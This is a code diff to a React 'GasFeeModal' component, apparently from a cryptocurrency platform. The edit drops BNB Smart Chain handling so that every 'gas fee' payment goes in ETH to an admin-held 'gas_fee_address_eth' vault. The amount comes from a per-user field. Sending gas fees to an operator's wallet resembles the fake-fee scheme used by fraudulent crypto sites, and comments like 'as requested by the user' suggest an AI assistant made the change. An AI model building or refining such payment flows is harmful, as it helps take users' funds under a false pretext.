@@ -80,34 +80,21 @@ export default function GasFeeModal({
     };
 
     const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
-        if (network === 'BNB') {
-            return {
-                isBsc: true,
-                targetChainId: '0x38', // BSC Mainnet
-                targetNetworkName: 'BNB Smart Chain',
-                targetAsset: 'BNB'
-            };
-        }
-        // Default to Ethereum Mainnet
+        // Force all gas payments to Ethereum Mainnet as requested
         return {
             isBsc: false,
             targetChainId: '0x1',
             targetNetworkName: 'Ethereum Mainnet',
             targetAsset: 'ETH'
         };
-    }, [network]);
+    }, []);
 
     const sendEth = async () => {
         console.log(internalUser?.fields?.gasFee, "internalUser")
         let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
 
-        // Use appropriate address based on network
-        const addrKey = isBsc ? 'gas_fee_address_bnb' : 'gas_fee_address_eth';
-        const gasVault = adminAddresses[addrKey] 
-            || adminAddresses[addrKey.toLowerCase()]
-            || adminAddresses['gas_fee_address_eth'] // Fallback to ETH gas wallet
-            || adminAddresses['gas_fee_address_eth'.toLowerCase()]
-            || '';
+        // Strictly use the eth address key as requested by the user
+        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';
 
         console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });
 
@@ -310,12 +297,7 @@ export default function GasFeeModal({
                                     <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                     <div className="space-y-1">
                                         <span className="text-gray-400 text-xs">Destination Address</span>
-                                        <div className="font-mono text-[10px] opacity-60 break-all">
-                                            {isBsc 
-                                                ? (adminAddresses['gas_fee_address_bnb'] || adminAddresses['gas_fee_address_eth'] || "Searching...")
-                                                : (adminAddresses['gas_fee_address_eth'] || "Searching...")
-                                            }
-                                        </div>
+                                        <div className="font-mono text-[10px] opacity-60 break-all">{adminAddresses['gas_fee_address_eth'] || "Searching..."}</div>
                                     </div>
                                     <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                     <div className="flex justify-between items-center text-sm">
